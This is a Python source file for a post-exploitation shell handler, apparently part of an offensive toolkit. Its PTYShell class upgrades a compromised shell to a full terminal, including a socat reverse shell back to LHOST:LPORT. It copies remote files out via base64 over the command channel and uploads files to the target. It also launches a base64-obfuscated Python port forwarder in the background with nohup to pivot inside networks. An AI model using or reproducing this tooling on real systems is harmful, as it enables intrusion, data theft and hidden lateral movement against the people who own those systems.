import base64
import os
from typing import Dict, Optional

from tools.log_utils import get_logger

logger = get_logger("interactive_shell")


class PTYShell:
    def __init__(self, exec_cmd: callable):
        self.exec = exec_cmd
        self._history = []
        self._cwd = "/tmp"

    def _run(self, cmd: str) -> str:
        self._history.append(cmd)
        r = self.exec(cmd)
        return r.get("output", "") if isinstance(r, dict) else str(r)

    def _detect_pty(self) -> bool:
        r = self._run("python3 -c 'import pty; print(\"pty_ok\")' 2>/dev/null || python -c 'import pty; print(\"pty_ok\")' 2>/dev/null")
        return "pty_ok" in r

    def upgrade(self) -> Dict:
        result = {"success": False, "method": None, "steps": []}
        if self._detect_pty():
            steps = [
                "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
                "export TERM=xterm-256color",
                "stty echo 2>/dev/null",
                "stty raw 2>/dev/null; fg 2>/dev/null; reset",
            ]
            result["steps"] = steps
            result["method"] = "python_pty"
            result["success"] = True
        else:
            r = self._run("which script 2>/dev/null && echo FOUND")
            if "FOUND" in r:
                steps = ["script -q /dev/null /dev/null", "export TERM=xterm-256color"]
                result["steps"] = steps
                result["method"] = "script_pty"
                result["success"] = True
            else:
                r = self._run("socat -V 2>/dev/null && echo FOUND")
                if "FOUND" in r:
                    steps = ["socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT"]
                    result["steps"] = steps
                    result["method"] = "socat_pty"
                    result["success"] = True
        return result

    def download(self, remote_path: str) -> Optional[bytes]:
        b64 = self._run("base64 -w0 %s 2>/dev/null || openssl base64 -A -in %s 2>/dev/null || cat %s | base64 -w0 2>/dev/null" % (remote_path, remote_path, remote_path))
        if b64 and len(b64) > 20:
            try:
                return base64.b64decode(b64.strip())
            except Exception:
                pass
        logger.warning("download %s failed", remote_path)
        return None

    def upload(self, local_path: str, remote_path: str) -> bool:
        try:
            with open(local_path, "rb") as f:
                data = f.read()
            b64 = base64.b64encode(data).decode()
            cmd = "echo '%s' | base64 -d > '%s' && echo UPLOAD_OK" % (b64, remote_path)
            r = self._run(cmd)
            if "UPLOAD_OK" in r:
                verify = self._run("ls -la '%s'" % remote_path)
                if str(len(data)) in verify or "UPLOAD_OK" in verify:
                    logger.info("uploaded %s -> %s (%d bytes)", local_path, remote_path, len(data))
                    return True
        except Exception as e:
            logger.error("upload error: %s", e)
        return False

    def port_forward(self, local_port: int, target_host: str, target_port: int) -> Dict:
        python_code = (
            "import socket,threading,sys;"
            "def f(s):"
            "  t=socket.socket();t.connect(('%s',%d));"
            "  while 1:"
            "    d=s.recv(4096);"
            "    if not d:break;t.send(d);"
            "    d2=t.recv(4096);"
            "    if not d2:break;s.send(d2);"
            "  s.close();t.close();"
            "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
            "s.bind(('0.0.0.0',%d));s.listen(50);"
            "while 1: threading.Thread(target=f,args=(s.accept()[0],)).start()" % (target_host, target_port, local_port)
        )
        b64 = base64.b64encode(python_code.encode()).decode()
        cmd = "nohup python -c \"exec(__import__('base64').b64decode('%s').decode())\" > /dev/null 2>&1 &" % b64
        self._run(cmd)
        result = {"success": True, "command": cmd, "local_port": local_port,
                   "forward_to": "%s:%d" % (target_host, target_port)}
        return result

    def interactive(self, init_cmd: str = ""):
        print("[*] Interactive shell. Type 'exit' to quit, 'upload <local> <remote>', 'download <remote>', 'forward <lp> <th> <tp>'")
        while True:
            try:
                cmd = input("[shell@%s]$ " % self._cwd).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit"):
                break
            if cmd.startswith("cd "):
                new_dir = cmd[3:].strip()
                r = self._run("cd %s && pwd" % new_dir)
                if r.strip():
                    self._cwd = r.strip()
                continue
            if cmd.startswith("download "):
                rpath = cmd[9:].strip()
                data = self.download(rpath)
                if data:
                    fname = os.path.basename(rpath) or "downloaded"
                    with open(fname, "wb") as f:
                        f.write(data)
                    print("[+] Downloaded %s (%d bytes) -> %s" % (rpath, len(data), fname))
                else:
                    print("[!] Download failed")
                continue
            if cmd.startswith("upload "):
                parts = cmd.split(None, 2)
                if len(parts) == 3:
                    if self.upload(parts[1], parts[2]):
                        print("[+] Upload OK")
                    else:
                        print("[!] Upload failed")
                continue
            if cmd.startswith("forward "):
                parts = cmd.split()
                if len(parts) == 4:
                    r = self.port_forward(int(parts[1]), parts[2], int(parts[3]))
                    print("[+] Port forward: 127.0.0.1:%d -> %s:%s" % (r["local_port"], r["forward_to"], parts[3]))
                continue
            if cmd == "upgrade":
                r = self.upgrade()
                if r["success"]:
                    print("[+] PTY upgrade steps:\n  " + "\n  ".join(r.get("steps", [])))
                continue
            r = self._run(cmd)
            print(r.strip() if r.strip() else "(no output)")
